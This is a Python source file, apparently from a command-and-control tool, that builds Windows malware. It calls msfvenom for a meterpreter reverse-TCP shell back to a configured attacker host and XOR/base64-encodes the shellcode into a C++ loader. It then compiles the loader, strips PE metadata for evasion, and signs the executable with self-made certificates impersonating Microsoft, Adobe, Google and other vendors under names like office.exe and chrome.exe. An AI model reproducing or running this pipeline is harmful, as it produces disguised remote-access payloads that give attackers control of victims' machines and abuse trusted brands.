# payloads/generator.py

import subprocess
import os
import random
import tempfile
import time
import base64
import shutil
import lief

from core.logger import log
from core.utils import generate_id
import config


# ─────────────────────────────────────────
# 📂 PATHS
# ─────────────────────────────────────────
BASE_DIR = os.path.dirname(__file__)
LOADER_DIR = os.path.join(BASE_DIR, "loaders")
OUTPUT_DIR = os.path.join(BASE_DIR, "output")

os.makedirs(OUTPUT_DIR, exist_ok=True)


# ─────────────────────────────────────────
# 🎓 CERT CLASS (UNCHANGED LOGIC)
# ─────────────────────────────────────────
class Certificate:
    def __init__(self):
        self.certificates = {
            "microsoft": {"name": "Microsoft Corporation", "url": "https://www.microsoft.com", "exe": "office.exe"},
            "adobe": {"name": "Adobe Systems Incorporated", "url": "https://www.adobe.com", "exe": "adobe.exe"},
            "apple": {"name": "Apple Inc.", "url": "https://www.apple.com", "exe": "apple.exe"},
            "oracle": {"name": "Oracle Corporation", "url": "https://www.oracle.com", "exe": "oracle.exe"},
            "google": {"name": "Google LLC", "url": "https://www.google.com", "exe": "chrome.exe"},
            "mozilla": {"name": "Mozilla Corporation", "url": "https://www.mozilla.org", "exe": "firefox.exe"},
            "intel": {"name": "Intel Corporation", "url": "https://www.intel.com", "exe": "intel.exe"},
            "ibm": {"name": "IBM Corporation", "url": "https://www.ibm.com", "exe": "ibm.exe"}
        }

    def get(self, name):
        return self.certificates.get(name, self.certificates["microsoft"])

    def random(self):
        return random.choice(list(self.certificates.items()))


# ─────────────────────────────────────────
# 🚀 MAIN GENERATOR
# ─────────────────────────────────────────
def generate_payload(data):
    """
    FULL REAL PAYLOAD PIPELINE (your logic preserved)
    """

    try:
        loader_name = data.get("loader", "earlybird")
        cert_name = data.get("cert", "microsoft")
        xor_key = data.get("xor_key") or random.randint(1, 254)

        cert_util = Certificate()
        certificate = cert_util.get(cert_name)

        HEX_KEY = f"{xor_key:02x}"

        log(f"Generating payload | loader={loader_name} cert={cert_name}")

        # SAFE temp dir
        temp_dir = tempfile.mkdtemp(prefix="c2_")

        SHELLCODE_RAW = os.path.join(temp_dir, "sc.raw")
        HEADER_FILE = os.path.join(temp_dir, "shellcode_encoded.h")
        TEMP_EXE = os.path.join(temp_dir, "temp_payload.exe")
        FINAL_EXE = os.path.join(
            temp_dir,
            f"payload_{loader_name}_{cert_name}_{HEX_KEY}.exe"
        )

        # ─────────────────────────────
        # 1. SHELLCODE
        # ─────────────────────────────
        log("Generating shellcode via msfvenom")

        subprocess.run([
            "msfvenom",
            "-p", "windows/x64/meterpreter/reverse_tcp",
            f"LHOST={config.LHOST}",
            f"LPORT={config.LPORT}",
            "EXITFUNC=thread",
            "-f", "raw",
            "-o", SHELLCODE_RAW
        ], check=True)

        # ─────────────────────────────
        # 2. ENCODE
        # ─────────────────────────────
        with open(SHELLCODE_RAW, "rb") as f:
            sc = f.read()

        xor_encoded = bytes([b ^ xor_key for b in sc])
        b64_encoded = base64.b64encode(xor_encoded).decode()

        # ─────────────────────────────
        # 3. HEADER
        # ─────────────────────────────
        with open(HEADER_FILE, "w") as f:
            f.write("#pragma once\n")
            f.write("const char *b64_shellcode =\n")

            for i in range(0, len(b64_encoded), 80):
                f.write(f'"{b64_encoded[i:i+80]}"\n')

            f.write(";\n")
            f.write(f"const unsigned char XOR_KEY = 0x{HEX_KEY};\n")

        # ─────────────────────────────
        # 4. COPY LOADER
        # ─────────────────────────────
        loader_src = os.path.join(LOADER_DIR, f"{loader_name}.cpp")

        if not os.path.exists(loader_src):
            return {"error": f"Loader not found: {loader_name}"}

        payload_cpp = os.path.join(temp_dir, "payload.cpp")
        shutil.copy(loader_src, payload_cpp)

        # ─────────────────────────────
        # 5. COMPILE
        # ─────────────────────────────
        log("Compiling payload")

        subprocess.run([
            "x86_64-w64-mingw32-g++",
            payload_cpp,
            "-o", TEMP_EXE,
            "-lcrypt32",
            "-s",
            "-static",
            "-O2",
            "-w",
            "-lurlmon"
        ], check=True)

        # ─────────────────────────────
        # 6. PE MODIFY (LIEF)
        # ─────────────────────────────
        log("Applying PE evasion")

        try:
            binary = lief.parse(TEMP_EXE)

            if binary:
                binary.header.time_date_stamps = int(time.time())

                if binary.has_debug:
                    binary.remove_debug()

                if binary.has_rich_header:
                    binary.rich_header = None

                builder = lief.PE.Builder(binary)
                builder.build()
                builder.write(TEMP_EXE)

        except Exception as e:
            log(f"LIEF warning: {e}")

        # ─────────────────────────────
        # 7. SIGN
        # ─────────────────────────────
        log("Signing payload")

        key_path = os.path.join(temp_dir, "key.pem")
        cert_path = os.path.join(temp_dir, "cert.pem")
        pfx_path = os.path.join(temp_dir, "cert.pfx")

        subprocess.run([
            "openssl", "req", "-x509", "-newkey", "rsa:2048",
            "-keyout", key_path,
            "-out", cert_path,
            "-days", "365", "-nodes",
            "-subj", f"/CN={certificate['name']}"
        ], check=True)

        subprocess.run([
            "openssl", "pkcs12",
            "-export",
            "-out", pfx_path,
            "-inkey", key_path,
            "-in", cert_path,
            "-passout", "pass:123456"
        ], check=True)

        subprocess.run([
            "osslsigncode",
            "sign",
            "-pkcs12", pfx_path,
            "-pass", "123456",
            "-n", certificate["exe"],
            "-i", certificate["url"],
            "-in", TEMP_EXE,
            "-out", FINAL_EXE
        ], check=True)

        # ─────────────────────────────
        # 8. READ + STORE
        # ─────────────────────────────
        with open(FINAL_EXE, "rb") as f:
            binary_data = f.read()

        payload_id = generate_id("payload")

        payload = {
            "id": payload_id,
            "loader": loader_name,
            "cert": cert_name,
            "xor_key": xor_key,
            "filename": os.path.basename(FINAL_EXE),
            "size": round(len(binary_data) / 1024, 2),
            "payload": base64.b64encode(binary_data).decode()
        }

        # SAFE STATE STORE
        try:
            from flask import current_app
            if hasattr(current_app, "state"):
                current_app.state.add_payload(payload)
        except Exception:
            pass

        log(f"Payload generated: {payload['filename']}")

        return payload

    except Exception as e:
        log(f"Generator error: {e}")
        return {"error": str(e)}
